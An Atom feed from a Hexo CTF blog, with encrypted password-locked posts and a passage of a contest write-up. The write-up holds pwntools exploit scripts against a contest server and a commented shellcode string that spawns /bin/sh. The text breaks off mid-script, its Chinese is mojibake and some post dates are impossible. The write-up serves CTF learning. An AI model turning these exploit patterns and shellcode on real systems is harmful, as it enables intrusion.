<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>M1key</title>
  
  <subtitle>M1key</subtitle>
  <link href="https://pz1o.top/atom.xml" rel="self"/>
  
  <link href="https://pz1o.top/"/>
  <updated>2021-06-11T15:17:46.716Z</updated>
  <id>https://pz1o.top/</id>
  
  <author>
    <name>M1key</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>something</title>
    <link href="https://pz1o.top/2099/11/11/something/"/>
    <id>https://pz1o.top/2099/11/11/something/</id>
    <published>2099-11-10T16:00:00.000Z</published>
    <updated>2021-06-11T15:17:46.716Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">ü§£ü§£ü§£</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
    
    
    <summary type="html">ü§£ü§£ü§£</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Flag</title>
    <link href="https://pz1o.top/2099/09/27/Flag/"/>
    <id>https://pz1o.top/2099/09/27/Flag/</id>
    <published>2099-09-27T15:15:44.000Z</published>
    <updated>2021-05-06T10:43:05.668Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Ëøô‰∏™Áúã‰∏ç‰∫ÜÔºåÂà´Áúã‰∫Ü</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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 </div>]]></content>
    
    
    <summary type="html">Ëøô‰∏™Áúã‰∏ç‰∫ÜÔºåÂà´Áúã‰∫Ü</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>PWNÂ§çÁé∞</title>
    <link href="https://pz1o.top/2099/04/01/PWN%E5%A4%8D%E7%8E%B0/"/>
    <id>https://pz1o.top/2099/04/01/PWN%E5%A4%8D%E7%8E%B0/</id>
    <published>2099-04-01T14:46:26.000Z</published>
    <updated>2021-06-11T15:45:43.478Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">Please enter the password to read the blog.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    
    <summary type="html">The article has been encrypted, please enter your password to view.&lt;br&gt;</summary>
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>wpÂ≠òÊ°£</title>
    <link href="https://pz1o.top/2023/06/02/wp%E5%AD%98%E6%A1%A3/"/>
    <id>https://pz1o.top/2023/06/02/wp%E5%AD%98%E6%A1%A3/</id>
    <published>2023-06-02T12:22:23.000Z</published>
    <updated>2021-06-11T15:41:49.133Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-‰∫îÊúàÊ†°Ëµõ"><a href="#0x01-‰∫îÊúàÊ†°Ëµõ" class="headerlink" title="0x01 ‰∫îÊúàÊ†°Ëµõ"></a>0x01 ‰∫îÊúàÊ†°Ëµõ</h1><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#import binascii</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line"><span class="comment">#p = remote("219.219.61.234",10001)</span></span><br><span class="line"><span class="comment">#elf = ELF("./pwn2")</span></span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"><span class="comment">#shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line"><span class="comment">#p=remote('219.219.61.234',10002)</span></span><br><span class="line">p=remote(<span class="string">'219.219.61.234'</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment"># p = process("./pwn1")</span></span><br><span class="line"><span class="comment"># #shellcode = asm(shellcraft.sh())</span></span><br><span class="line">pld=p32(<span class="number">2021</span>)*<span class="number">0x30</span></span><br><span class="line">sl(pld)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>Áõ¥Êé•‰ªªÊÑèÂÜô __stack_chk_fail ÁöÑgotË°®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#import binascii</span></span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">p = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10001</span>)</span><br><span class="line">elf = ELF(<span class="string">"./pwn2"</span>)</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"><span class="comment">#shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span></span><br><span class="line"><span class="comment">#p=remote('219.219.61.234',10002)</span></span><br><span class="line">bin_sh=<span class="number">0x8048586</span></span><br><span class="line"><span class="comment"># p = process("./pwn2")</span></span><br><span class="line"><span class="comment"># pld="%15$p"</span></span><br><span class="line"><span class="comment"># sl(pld)</span></span><br><span class="line"><span class="comment"># ru("?")</span></span><br><span class="line"><span 